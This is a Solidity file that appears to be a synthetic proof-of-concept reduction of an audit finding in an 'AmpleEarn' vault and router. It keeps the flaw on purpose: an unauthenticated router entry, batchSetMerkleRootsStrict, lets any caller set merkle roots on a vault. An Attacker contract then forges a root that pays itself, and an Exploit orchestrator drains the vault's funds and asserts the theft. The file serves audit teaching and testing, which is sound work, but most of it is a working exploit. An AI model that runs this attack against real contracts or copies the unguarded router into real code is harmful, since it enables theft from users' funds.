// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    AmpleEarn — Unrestricted router allows unauthorized merkle root setting
    (Pashov Audit Group, finding #64041, C-01)

    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: AmpleEarnRouter.batchSetMerkleRootsStrict() calls vault
    setMerkleRoots() directly (not via EVC). Authorization on the vault is
    based on msg.sender, so when the router is a payout manager, ANY external
    caller can set merkle roots for that vault and steal payouts.

    Vulnerable line preserved verbatim (@> VULN).
//////////////////////////////////////////////////////////////////////////*/

/// @dev Minimal ERC20 used as vault assets / payout currency.
contract MockToken {
    string public constant name = "USDC";
    string public constant symbol = "USDC";
    uint8 public constant decimals = 6;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    uint256 public totalSupply;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
        totalSupply += amt;
    }

    function approve(address spender, uint256 amt) external returns (bool) {
        allowance[msg.sender][spender] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        if (msg.sender != from) {
            uint256 a = allowance[from][msg.sender];
            require(a >= amt, "allowance");
            allowance[from][msg.sender] = a - amt;
        }
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

library AmpleErrorsLib {
    error NotPayoutManagerRole();
    error AlreadyClaimed();
    error InvalidProof();
}

struct VRFProofDetails {
    bytes32 proof;
    bytes32 seed;
    bytes32 publicKey;
    bytes32 vrfHash;
}

struct SetMerkleRootsParams {
    address vault;
    bytes32 participantsRoot;
    bytes32 designatedRecipientsRoot;
    uint8 designatedRecipientsCount;
    uint256 totalTickets;
    VRFProofDetails vrfProofDetails;
}

/// @notice Reduced AmpleEarn vault. setMerkleRoots() authorizes via
///         _msgSenderOnlyEVCAccountOwner() which returns msg.sender when the
///         call is NOT through EVC (router path). claimDesignated transfers
///         the designated payout to the leaf user.
contract AmpleEarn {
    MockToken public immutable asset;
    address public owner;
    mapping(address => bool) public isPayoutManager;

    // payout state
    uint256 public nextPayoutId;
    mapping(uint256 => bytes32) public designatedRecipientsRoot;
    mapping(uint256 => uint256) public totalTicketsOf;
    mapping(uint256 => mapping(address => bool)) public claimed;

    // vault funds available for payout
    // (assets sit on this contract via MockToken.balanceOf)

    constructor(MockToken _asset, address _owner) {
        asset = _asset;
        owner = _owner;
    }

    function setPayoutManager(address who, bool ok) external {
        require(msg.sender == owner, "only owner");
        isPayoutManager[who] = ok;
    }

    /// @dev Real EVC helper returns msg.sender when call is not from EVC.
    function _msgSenderOnlyEVCAccountOwner() internal view returns (address) {
        return msg.sender;
    }

    // ============================================================
    //  Vulnerable auth surface — faithful reduction of AmpleEarn
    //  setMerkleRoots (auth via _msgSenderOnlyEVCAccountOwner).
    // ============================================================
    function setMerkleRoots(
        uint256 totalTickets,
        uint8 designatedRecipientsCount,
        bytes32 designatedRecipientsRoot_,
        bytes32 participantsRoot,
        VRFProofDetails calldata vrfProofDetails
    ) external returns (uint256 payoutId) {
        // nonReentrant omitted (not relevant to the auth bug)
        address msgSender = _msgSenderOnlyEVCAccountOwner();
        // When called via router (not EVC), msgSender == router address.
        // If the router is a payout manager, ANY external caller who invokes the
        // router can pass this check and set arbitrary merkle roots.
        // FIX: call setMerkleRoots through EVC so _msgSenderOnlyEVCAccountOwner
        // resolves to the external account owner; or enforce auth in the router.
        if (!isPayoutManager[msgSender] && msgSender != owner) revert AmpleErrorsLib.NotPayoutManagerRole(); // @> VULN: auth sees router, not EOA
        participantsRoot; // silence
        vrfProofDetails; // silence
        designatedRecipientsCount; // silence
        payoutId = nextPayoutId++;
        designatedRecipientsRoot[payoutId] = designatedRecipientsRoot_;
        totalTicketsOf[payoutId] = totalTickets;
    }

    /// @dev Designated-recipient claim. Synthetic uses a simplified "leaf hash"
    ///      equality so the attacker's forged root (that only contains the
    ///      attacker) validates. Real code uses OpenZeppelin MerkleProof.
    function claimDesignated(
        uint256 payoutId,
        address user,
        uint256 payoutAmount,
        bytes32 /* leafHint */
    ) external {
        require(!claimed[payoutId][user], "claimed");
        // Reduced merkle check: root must equal keccak of (user, amount).
        // Attacker who set the root to keccak256(abi.encode(attacker, amount))
        // can claim; legitimate multi-leaf trees would use proper proofs.
        bytes32 expected = keccak256(abi.encode(user, payoutAmount));
        if (designatedRecipientsRoot[payoutId] != expected) revert AmpleErrorsLib.InvalidProof();
        claimed[payoutId][user] = true;
        require(asset.transfer(user, payoutAmount), "xfer");
    }
}

/// @notice AmpleEarnRouter — batchSetMerkleRootsStrict has NO authorization.
///         It blindly forwards to vault.setMerkleRoots().
contract AmpleEarnRouter {
    // ============================================================
    //  Vulnerable router — no auth check on batchSetMerkleRootsStrict
    // ============================================================
    function batchSetMerkleRootsStrict(SetMerkleRootsParams[] calldata params)
        external
        returns (uint256[] memory payoutIds)
    {
        payoutIds = new uint256[](params.length);
        for (uint256 i = 0; i < params.length; i++) {
            // No authorization — any caller can set roots for any vault the
            // router is a payout manager of. Fix: enforce msg.sender is an
            // authorized operator, or route through EVC so vault sees real owner.
            payoutIds[i] = AmpleEarn(params[i].vault).setMerkleRoots( // @> VULN: unrestricted router entry
                params[i].totalTickets,
                params[i].designatedRecipientsCount,
                params[i].designatedRecipientsRoot,
                params[i].participantsRoot,
                params[i].vrfProofDetails
            );
        }
    }
}

/// @dev Victim vault owner (deploys vault, funds it, registers router as manager).
contract OwnerHelper {
    function setup(AmpleEarn vault, AmpleEarnRouter router, MockToken tok, uint256 fundAmt) external {
        vault.setPayoutManager(address(router), true);
        // fund vault so payouts can be claimed
        tok.transfer(address(vault), fundAmt);
    }
}

/// @dev Attacker: forges a designated-recipient root that pays itself, sets it
///      via the unrestricted router, then claims the vault's funds.
contract Attacker {
    function attack(AmpleEarnRouter router, AmpleEarn vault, uint256 stealAmt) external {
        // Forge a "merkle root" that is just the leaf hash of (attacker, stealAmt).
        bytes32 forgedRoot = keccak256(abi.encode(address(this), stealAmt));

        SetMerkleRootsParams[] memory params = new SetMerkleRootsParams[](1);
        params[0] = SetMerkleRootsParams({
            vault: address(vault),
            participantsRoot: bytes32(uint256(1)),
            designatedRecipientsRoot: forgedRoot,
            designatedRecipientsCount: 1,
            totalTickets: stealAmt,
            vrfProofDetails: VRFProofDetails({
                proof: bytes32(uint256(1)),
                seed: bytes32(uint256(2)),
                publicKey: bytes32(uint256(3)),
                vrfHash: bytes32(uint256(4))
            })
        });

        // Unrestricted: anyone can call this when router is payout manager.
        uint256[] memory ids = router.batchSetMerkleRootsStrict(params);
        // Claim the forged designated payout.
        vault.claimDesignated(ids[0], address(this), stealAmt, forgedRoot);
    }
}

/// @dev Orchestrator. CREATE order:
///      1 MockToken, 2 OwnerHelper, 3 AmpleEarn vault, 4 AmpleEarnRouter, 5 Attacker
contract Exploit {
    uint256 public constant STEAL = 100e6; // 100 USDC (6 decimals)

    MockToken public tok; // nonce 1
    OwnerHelper public ownerH; // nonce 2
    AmpleEarn public vault; // nonce 3 — vulnerable
    AmpleEarnRouter public router; // nonce 4 — vulnerable unrestricted entry
    Attacker public attacker; // nonce 5

    constructor() {
        tok = new MockToken();
        ownerH = new OwnerHelper();
        vault = new AmpleEarn(tok, address(ownerH));
        router = new AmpleEarnRouter();
        attacker = new Attacker();

        // Mint funds to owner helper; it registers router as payout manager and
        // funds the vault with STEAL USDC (the payout pot).
        tok.mint(address(ownerH), STEAL);
        ownerH.setup(vault, router, tok, STEAL);
    }

    function run() external {
        require(tok.balanceOf(address(vault)) == STEAL, "vault not funded");
        require(tok.balanceOf(address(attacker)) == 0, "attacker should start empty");
        require(vault.isPayoutManager(address(router)), "router must be payout manager");

        // === attack: unrestricted router sets forged merkle roots + claim ===
        attacker.attack(router, vault, STEAL);

        // HARM: attacker drained the vault's payout funds via unauthorized root set.
        require(tok.balanceOf(address(attacker)) == STEAL, "harm not demonstrated: attacker did not steal");
        require(tok.balanceOf(address(vault)) == 0, "vault should be drained");
    }
}
